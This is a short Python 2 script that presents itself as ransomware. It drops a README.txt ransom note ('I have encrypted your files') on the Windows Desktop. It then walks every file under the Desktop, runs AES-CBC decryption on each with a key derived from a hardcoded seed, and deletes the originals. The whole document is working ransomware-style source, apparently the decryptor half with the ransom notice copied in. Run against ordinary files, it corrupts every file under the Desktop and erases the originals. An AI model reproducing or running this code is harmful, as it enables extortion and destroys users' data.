import os,random,struct
from random import randint
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

path = [ os.getenv('HOMEPATH') + "\Desktop\\"] #path of our target folder

def notification():
    note = "Hi, this is a ransomware and I have encrypted your files."
    #print os.getenv('HOMEPATH')
    desktop_dir = os.getenv('HOMEPATH') + "\Desktop\\" #for windows, for unix is 'HOME'
    outputfile = desktop_dir + "README.txt"
    handler = open(outputfile,'w')
    handler.write(note)
    handler.close()



def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


    os.unlink(in_filename) 


notification()
for paths in path:
    for root, dirs, files in os.walk(paths):
        for names in files:
            print names+'\r'
            print root+'\r'
            decrypt_file(SHA256.new("this_is_the_seed").digest(),str(os.path.join(root,names)))	